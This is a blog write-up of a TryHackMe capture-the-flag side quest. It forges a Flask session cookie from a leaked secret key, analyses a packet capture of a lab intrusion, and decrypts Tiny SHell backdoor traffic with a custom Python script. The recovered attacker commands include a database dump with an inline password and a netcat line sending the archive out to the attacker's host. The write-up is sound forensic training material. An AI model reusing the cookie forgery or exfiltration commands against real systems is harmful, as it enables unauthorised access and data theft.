---
title: "TryHackMe: AoC 2024 Side Quest One"
author: jaxafed
categories: [TryHackMe]
date: 2025-01-01 00:00:01 +0000
tags: [web, flask, pcap, wireshark, tshark, reverse engineering, ghidra, python]
render_with_liquid: false
media_subpath: /images/tryhackme_aoc2024_sidequest_one/
image:
  path: room_image.webp
---

**First Side Quest** began by discovering the source code for a **Flask** web application on **GitHub** and finding this web application running on the machine associated with **Advent of Cyber Day 1**. By using the `secret_key` found in the source code to forge a cookie, we authenticated to the server and discovered the keycard containing the password.

Using this password, we extracted the archive for the **First Side Quest** and found a packet capture file inside. Upon examining the capture, we uncovered how an attacker obtained credentials, accessed the target system, and downloaded several files to the victim host. 

Examining the downloaded files, we identified one of them as the `Tiny SHell` program, an open-source backdoor. By analyzing its source code, we developed a program to decrypt its traffic and revealed the commands executed by the attacker. 

Finally, with knowledge of these commands, we recovered an archive the attacker had extracted, and by reading the file inside the archive, completed the challenge.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/r/room/adventofcyber24sidequest){: .center }

## Finding the Keycard

### Discovering the Repository

While solving the `Advent of Cyber Day 1` challenge, we came across the [`Bloatware-WarevilleTHM`](https://github.com/Bloatware-WarevilleTHM) user on GitHub.

![Github User](github_user.webp){: width="1200" height="600" }

Apart from the repository related to the regular **Advent of Cyber**, the user also has another interesting repository titled [C2-Server](https://github.com/Bloatware-WarevilleTHM/C2-Server), which contains the source code for a simple `Flask` web application.

![Github Repository](github_repository.webp){: width="1200" height="600" }

### Accessing the Web Server

According to the source code, the server runs on port `8000` and by checking port `8000` on the **Advent of Cyber Day 1** machine, we can find this web application running.

![Web 8000 Login](web_8000_login.webp){: width="1200" height="600" }

While the credentials from the source code (**admin:securepassword**) do not work, there is a possibility that the application still uses the same `secret_key` for session management. This means we might be able to log in to the application by forging a cookie.

The easiest way to do this would be to write our own `Flask` server that generates a cookie in the same way:

```python
from flask import Flask, session

app = Flask(__name__)

app.secret_key = "@09JKD0934jd712?djD"

@app.route("/", methods=["GET"])
def index():
    session["logged_in"] = True
    session["username"] = "admin"
    return "", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
```

Now, running the server and making a request to it, we can retrieve the `session` cookie.

```bash
$ curl -v 127.0.0.1:8000 2>&1 | grep Set-Cookie
< Set-Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.Z0_t5Q.ApkOxFbyF5lSety4NPaIel1OzSg; HttpOnly; Path=/
```

After setting our cookie and visiting `http://10.10.209.9:8000/`, we are redirected to `/dashboard` as we were able to authenticate successfully.

![Web 8000 Dashboard](web_8000_dashboard.webp){: width="1200" height="600" }

Lastly, by checking the `Data` tab at `http://10.10.209.9:8000/data`, we discover the keycard with the password on it: `vK[REDACTED]LU`.

![Web 8000 Data](web_8000_data.webp){: width="1200" height="600" }

## Side Quest

Now that we have the password, we can begin the side quest by downloading the `aoc_sq_1.zip` from the **First Side Quest** machine and extracting the archive using the password from the keycard.

```bash
$ wget 'http://10.10.159.102/aoc_sq_1.zip'

$ unzip aoc_sq_1.zip
Archive:  aoc_sq_1.zip
[aoc_sq_1.zip] traffic.pcap password:
  inflating: traffic.pcap
 ```

### Examining the Packet Capture

Inside the archive, there is a single file named `traffic.pcap`. Let's open it in `Wireshark` to examine it.

Checking the `Conversations`, we can clearly see that `10.13.44.207` is conducting a port scan against the `10.10.103.220` host.

![Traffic Port Scan](traffic_port_scan.webp){: width="1200" height="600" }

After the port scan, we can also see some `HTTP` traffic on port 80, some `SSH` traffic on port 22, and some unknown traffic on ports 9001 and 9002 between the attacker and the target host.

![Traffic Port Scan](traffic_conversations.webp){: width="1200" height="600" }

Checking the `HTTP` traffic involving the attacker's IP address, we can see the attacker using `gobuster` to enumerate the directories in the web application after discovering it to be open from the port scan.

![Traffic Attacker Http](traffic_attacker_http.webp){: width="1200" height="600" }

After discovering the `/admin/login.php` endpoint through directory brute-forcing, we can see the attacker trying to log in to the application with the `mcskidy:mcskidy` credentials.

![Traffic Attacker Http Two](traffic_attacker_http2.webp){: width="1200" height="600" }

When this fails, we can see the attacker creating an account by making a `POST` request to the `/register.php` endpoint with the `frostyfox:QU[REDACTED]1R` credentials.

![Traffic Attacker Http Three](traffic_attacker_http3.webp){: width="1200" height="600" }

After the login, we can also see the attacker submitting a URL to the site pointing to their own web server.

![Traffic Attacker Http Four](traffic_attacker_http4.webp){: width="1200" height="600" }

Then, we can see the victim visiting the URL submitted by the attacker (`http://10.13.44.207/index.html`) and getting redirected to `http://10.13.44.207/admin.html`. This page is a copy of the actual login page from `http://10.10.103.220/admin/login.php`, and the `mcskidy` user falls victim to this attack, submitting their credentials to the attacker's web server as `mcskidy:pb[REDACTED]bF`.

![Traffic Attacker Http Five](traffic_attacker_http5.webp){: width="1200" height="600" }

Now that the attacker has the credentials, we can see them first logging in to the web application and then establishing an SSH session.

While this `SSH` session is in progress, we can also see a couple of interesting pieces of traffic being captured:

- First, the `exp_file_credential` and `ff` files being downloaded from the attacker's web server.
- Second, we once again observe the unknown traffic on `10.10.103.220:9001` and `10.13.44.207:9002`.

![Traffic Attacker](traffic_attacker.webp){: width="1200" height="600" }

### Discovering the Tiny SHell

Exporting and analyzing the `exp_file_credential` and `ff` files, we quickly discover that `exp_file_credential` is the exploit for the `CVE-2022-2588` vulnerability found [here](https://github.com/Markakd/CVE-2022-2588).

Examining the `ff` binary with the `strings` tool, we can discover the string `Usage: %s [ -c [connect_back_host] ] [ -s secret ] [ -p port ]`, and searching for it leads us to [`https://github.com/mame82/ls19_tsh_mod`](https://github.com/mame82/ls19_tsh_mod), where we identify the program as the `Tiny SHell` server. This is a simple backdoor for **Unix** systems that allows an attacker to execute commands and upload or download files.

Since most of the arguments for the program can be hardcoded, we can try to discover them by examining the binary in `Ghidra`.

In `Ghidra`, we can see the application listens on `10.10.103.220` at port `9001 (0x2329)` with the secret as `Su[REDACTED]Et`. This correlates with the traffic we observed in the packet capture.

![Traffic Attacker](ghidra_tinyshell_arguments.webp){: width="1200" height="600" }

### Analyzing the Code

Now that we know the application responsible for the traffic, we can examine the source code for `Tiny SHell` at `https://github.com/mame82/ls19_tsh_mod` to figure out how it works and decrypt the traffic.

In the `tsh.c` file, we can see that after all the code to connect to the server, the client calls the `pel_client_init` function with the secret.

```c
ret = pel_client_init( server, secret );
```

Checking the `pel_client_init` function, we can see it generates two values `IV1` and `IV2` by `SHA1` hashing the `current time` with `pid` and `pid plus one`. These values are then sent to the server.

```c
int pel_client_init( int server, char *key )
{
    int ret, len, pid;
    struct timeval tv;
    struct sha1_context sha1_ctx;
    unsigned char IV1[20], IV2[20];

    /* generate both initialization vectors */

    pid = getpid();

    if( gettimeofday( &tv, NULL ) < 0 )
    {
        pel_errno = PEL_SYSTEM_ERROR;

        return( PEL_FAILURE );
    }

    sha1_starts( &sha1_ctx );
    sha1_update( &sha1_ctx, (uint8 *) &tv,  sizeof( tv  ) );
    sha1_update( &sha1_ctx, (uint8 *) &pid, sizeof( pid ) );
    sha1_finish( &sha1_ctx, &buffer[ 0] );

    memcpy( IV1, &buffer[ 0], 20 );

    pid++;

    if( gettimeofday( &tv, NULL ) < 0 )
    {
        pel_errno = PEL_SYSTEM_ERROR;

        return( PEL_FAILURE );
    }

    sha1_starts( &sha1_ctx );
    sha1_update( &sha1_ctx, (uint8 *) &tv,  sizeof( tv  ) );
    sha1_update( &sha1_ctx, (uint8 *) &pid, sizeof( pid ) );
    sha1_finish( &sha1_ctx, &buffer[20] );

    memcpy( IV2, &buffer[20], 20 );

    /* and pass them to the server */

    ret = pel_send_all( server, buffer, 40, 0 );
...
```

Next, it calls the `pel_setup_context` function with the `IV1` and `IV2` values to set up the **AES** encryption/decryption contexts for sending and receiving messages.

```c
pel_setup_context( &send_ctx, key, IV1 );
pel_setup_context( &recv_ctx, key, IV2 );
```

Checking the `pel_setup_context` function, we can see that it generates the `AES` key for communication by `SHA1` hashing the `secret key` and the `IV` value passed. It also stores the first 16 bytes of the IV value in the `LCT` variable. Additionally, the function sets up the `HMAC` operation to verify the package's integrity, but since this is not relevant to our analysis, we can ignore this part.

```c
void pel_setup_context( struct pel_context *pel_ctx,
                        char *key, unsigned char IV[20] )
{
    int i;
    struct sha1_context sha1_ctx;

    sha1_starts( &sha1_ctx );
    sha1_update( &sha1_ctx, (uint8 *) key, strlen( key ) );
    sha1_update( &sha1_ctx, IV, 20 );
    sha1_finish( &sha1_ctx, buffer );

    aes_set_key( &pel_ctx->SK, buffer, 128 );

    memcpy( pel_ctx->LCT, IV, 16 );
...
}
```

After this, the `pel_client_init` function sends a challenge to the server and receives a challenge back to confirm that both the client and server are using the same secret key.

```c
...
ret = pel_send_msg( server, challenge, 16 );

if( ret != PEL_SUCCESS ) return( PEL_FAILURE );

/* handshake - decrypt and verify the server's challenge */

ret = pel_recv_msg( server, buffer, &len );

if( ret != PEL_SUCCESS ) return( PEL_FAILURE );

if( len != 16 || memcmp( buffer, challenge, 16 ) != 0 )
{
    pel_errno = PEL_WRONG_CHALLENGE;

    return( PEL_FAILURE );
}

pel_errno = PEL_UNDEFINED_ERROR;

return( PEL_SUCCESS ); 
```

Lastly, returning to the `tsh.c` file, we can see that from this point onward, depending on the action chosen by the user, the program performs operations such as downloading or uploading files, executing commands, or spawning a shell.

```c
switch( action )
{
    case GET_FILE:

        ret = tsh_get_file( server, argv[3], argv[4] );
        break;

    case PUT_FILE:

        ret = tsh_put_file( server, argv[3], argv[4] );
        break;

    case RUNSHELL:

        ret = ( ( argc == 3 )
            ? tsh_runshell( server, argv[2] )
            : tsh_runshell( server, "exec bash --login" ) );
        break;

    default:

        ret = -1;
        break;
}
```

And to be able to decrypt this traffic, we can analyze what the application does when receiving messages by checking the `pel_recv_msg` function.

First, we observe that it reads the first 16 bytes from the received data, decrypts it, and then performs an `XOR` operation with the `LCT` (last cipher text). The program essentially uses `ECB` mode of `AES` for encryption and decryption. The manual `XOR` operation with the `LCT` turns it into `CBC` mode. Later in the decryption code, we can simply use `CBC` mode while keeping track of the `LCT` throughout the entire session and use it as the `IV` value.

After that, it extracts the length of the message from the first two bytes of the decrypted data, restores the received data to its original state, and ensures that the message length is valid.

```c
int pel_recv_msg( int sockfd, unsigned char *msg, int *length )
{
    unsigned char temp[16];
    unsigned char hmac[20];
    unsigned char digest[20];
    struct sha1_context sha1_ctx;
    int i, j, ret, blk_len;

    /* receive the first encrypted block */

    ret = pel_recv_all( sockfd, buffer, 16, 0 );

    if( ret != PEL_SUCCESS ) return( PEL_FAILURE );

    /* decrypt this block and extract the message length */

    memcpy( temp, buffer, 16 );

    aes_decrypt( &recv_ctx.SK, buffer );

    for( j = 0; j < 16; j++ )
    {
        buffer[j] ^= recv_ctx.LCT[j];
    }

    *length = ( ((int) buffer[0]) << 8 ) + (int) buffer[1];

    /* restore the ciphertext */

    memcpy( buffer, temp, 16 );

    /* verify the message length */

    if( *length <= 0 || *length > BUFSIZE )
    {
        pel_errno = PEL_BAD_MSG_LENGTH;

        return( PEL_FAILURE );
    }
```

Next, it rounds the message length plus the message length size (2 bytes) to the nearest multiple of 16 bytes, since `AES` operates on 16-byte blocks. It then receives the appropriate number of blocks, minus the first 16-byte block it received beforehand that includes the message length, plus 20 bytes for the `HMAC`, and decrypts the calculated number of blocks, updating the `LCT` as it goes.

```c
/* round up to AES block length (16 bytes) */

blk_len = 2 + *length;

if( ( blk_len & 0x0F ) != 0 )
{
    blk_len += 16 - ( blk_len & 0x0F );
}

/* receive the remaining ciphertext and the mac */

ret = pel_recv_all( sockfd, &buffer[16], blk_len - 16 + 20, 0 );

if( ret != PEL_SUCCESS ) return( PEL_FAILURE );

memcpy( hmac, &buffer[blk_len], 20 );

...

/* finally, decrypt and copy the message */

for( i = 0; i < blk_len; i += 16 )
{
    memcpy( temp, &buffer[i], 16 );

    aes_decrypt( &recv_ctx.SK, &buffer[i] );

    for( j = 0; j < 16; j++ )
    {
        buffer[i + j] ^= recv_ctx.LCT[j];
    }

    memcpy( recv_ctx.LCT, temp, 16 );
}
```

Finally, it skips the message length from the beginning of the decrypted data and returns the decrypted message using the extracted message length.

```c
memcpy( msg, &buffer[2], *length );

pel_errno = PEL_UNDEFINED_ERROR;

return( PEL_SUCCESS );
```

To summarize, the client generates two values from the `time` and `pid` and sends them to the server. These values, along with the `secret key`, are then used to calculate the `AES` key used by both the client and the server and the exchanged packets have the following format: **`AES 128 CBC(Message Size (2 Bytes) + Message) + HMAC`**.

### Decrypting the Tiny SHell Traffic

Now that we know how the application works, we can begin decrypting the traffic.

First, we can use `tshark` to extract all the traffic going to or coming from `10.10.103.220:9001`.

```bash
$ tshark -r traffic.pcap -Y "ip.addr == 10.10.103.220 && tcp.port == 9001" -w tinyshelltraffic.pcap
```
{: .wrap }

Then, we can write a `Python` script to read packets from this capture. First, we get the `IV1` and `IV2` values and use them with the secret we discovered to calculate both the client and server keys. Afterward, we decrypt the traffic as follows:

```python
#!/usr/bin/env python3

from scapy.all import rdpcap, IP, Raw
from Crypto.Cipher import AES
import hashlib
import sys

secret = b"SuP3RSeCrEt"
client_ip, server_ip = "10.13.44.207", "10.10.103.220"
client_lct = server_lct = client_key = server_key = b""
pcap_file = "tinyshelltraffic.pcap"
packets = rdpcap(pcap_file)

def sha1sum(data):
    return hashlib.sha1(data).digest()

def aes_decrypt(data, key, iv):
    return AES.new(key, AES.MODE_CBC, iv).decrypt(data)

def decrypt_packet(data, key, lct):
    message, decrypted_length = b"", 0
    while decrypted_length < len(data):
        block = aes_decrypt(data[decrypted_length:decrypted_length+16], key, lct)
        msg_len = (block[0] << 8) + block[1]
        block_len = ((2 + msg_len + 15) // 16) * 16  # round up to multiple of 16
        decrypted_data = aes_decrypt(data[decrypted_length:decrypted_length + block_len], key, lct)
        lct = data[decrypted_length + block_len - 16:decrypted_length + block_len]
        message += decrypted_data[2:2 + msg_len]
        decrypted_length += block_len + 20
    return message, lct

client_send_challenge = client_send_action = server_send_challenge = False

for packet in packets:
    if IP in packet and Raw in packet:
        src_ip, data = packet[IP].src, packet[Raw].load
        if len(data) == 40:
            client_lct, server_lct = data[:16], data[20:36]
            sys.stdout.buffer.write(b"[+] Client send IV1: " + data[:20].hex().encode() + b"\n")
            sys.stdout.buffer.write(b"[+] Client send IV2: " + data[20:].hex().encode() + b"\n")
            client_key = sha1sum(secret + data[:20])[:16]
            server_key = sha1sum(secret + data[20:])[:16]
            sys.stdout.buffer.write(b"[+] Client key: " + client_key.hex().encode() + b"\n")
            sys.stdout.buffer.write(b"[+] Server key: " + server_key.hex().encode() + b"\n")
            continue

        if src_ip == client_ip:
            message, client_lct = decrypt_packet(data, client_key, client_lct)
            if not client_send_challenge:
                sys.stdout.buffer.write(b"[+] Client challenge: " + message.hex().encode() + b"\n")
                client_send_challenge = True
            elif not client_send_action:
                client_send_action = True
                if message == b"\x03":
                    sys.stdout.buffer.write(b"[+] Client send action 3 (RUNSHELL).\n")
                    sys.stdout.buffer.write(b"[+] Dumping commands run:\n")
                else:
                    sys.stdout.buffer.write(b"[!] Can't handle other actions.\n")
                    sys.exit(0)
            #sys.stdout.buffer.write(message)
        elif src_ip == server_ip:
            message, server_lct = decrypt_packet(data, server_key, server_lct)
            if not server_send_challenge:
                sys.stdout.buffer.write(b"[+] Server challenge: " + message.hex().encode() + b"\n")
                server_send_challenge = True
            else:
                sys.stdout.buffer.write(message)

```
{: file="decrypt.py "}

> There is no need to print what the client sends, since it spawns an interactive shell in this case. Thus, the server will mirror anything the client sends.
{: .prompt-tip }

Now, by running the script, we can capture all the commands run by the attacker using the `Tiny SHell`.

```console
$ python3 decrypt.py
[+] Client send IV1: 26f321efd8ee637c408657b6fd94059e33191e95
[+] Client send IV2: 3a41611cb0b4b3a0f889f679616120961d87f683
[+] Client key: b2111707b9855c80935c9373f0537f4a
[+] Server key: d11851d2a0bc9f66a9627cb0e4b6d7e4
[+] Client challenge: 5890ae86f1b91cf6298395711dde580d
[+] Server challenge: 5890ae86f1b91cf6298395711dde580d
[+] Client send action 3 (RUNSHELL).
[+] Dumping commands run:
...
root@database:/tmp# mysqldump -u mcskidy -p'aBT4ZfhteNRE3ah' elves elf > elves.sql
mysqldump: [Warning] Using a password on the command line interface can be insecure.
root@database:/tmp# zip -P 9j[REDACTED]XR elves.zip elves.sql
  adding: elves.sql (deflated 58%)
root@database:/tmp# nc -w 3 10.13.44.207 9002 < elves.zip
...                                                                                                        
```

From the output, there are three commands that are of interest to us:

  - First, we can see the database being dumped to the `elves.sql` file with the `mysqldump` command:
  ```bash
  mysqldump -u mcskidy -p'aBT4ZfhteNRE3ah' elves elf > elves.sql
  ```
  - Second, we can see this file being archived as `elves.zip` with the `zip` binary as follows:
  ```bash
  zip -P 9j[REDACTED]XR elves.zip elves.sql
  ```
  - Third, we can also see how the attacker extracted this file using `nc`:
  ```bash
  nc -w 3 10.13.44.207 9002 < elves.zip
  ```

### Recovering the Extracted Zip File

Since we now know that the archive, including the database dump, was extracted via `nc` on `10.13.44.207:9002`, we can use `tshark` once more to extract the data going to `10.13.44.207:9002` and recover this archive as follows:

```bash
$ tshark -r traffic.pcap -Y "ip.dst_host == 10.13.44.207 && tcp.dstport == 9002" -T fields -e data | xxd -r -p > elves.zip
```
{: .wrap }

Extracting the archive with the password we discovered from the `zip` command run by the attacker, there is a single file inside: `elves.sql` as expected.

```bash
$ unzip elves.zip
Archive:  elves.zip
[elves.zip] elves.sql password:
  inflating: elves.sql
```

Inside this `elves.sql` file, we can find `Mcskidy`'s password and complete the room.

```bash
$ cat elves.sql
-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
--
-- Host: localhost    Database: elves
-- ------------------------------------------------------
-- Server version       8.0.28-0ubuntu0.20.04.3
...
LOCK TABLES `elf` WRITE;
/*!40000 ALTER TABLE `elf` DISABLE KEYS */;
INSERT INTO `elf` VALUES (1,'bloatware','$2a$04$RBmm/E9BYc0MGcOVIwKCoerMyFYvN.Uygv9/CAHrYT4qgJzIYNmaq','2024-11-12 22:59:26'),(2,'freeware','$2a$04$tYjkpRuiO4A.Hoyp.7Q2OuMjBdpT3Aoy4u6w6O19Xj4hksAuIjevm','2024-11-12 22:59:26'),(3,'firmware','$2a$04$BDsYzkVX8MDB/PNe2ZIoIuB7FhlKV0bOWkxZfznlFf4CMPMRgRIUS','2024-11-12 22:59:26'),(4,'hardware','$2a$04$IXOjpLJgcjnJVxW69u3aCO8ISfnMq/1VEeLBCGhKFHbLAzDAZ4F6m','2024-11-12 22:59:26'),(5,'mcskidy','fa[REDACTED]0=','2024-11-12 22:59:26');
...
-- Dump completed on 2024-11-13  0:08:31
```
{: .wrap }

<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}
</style>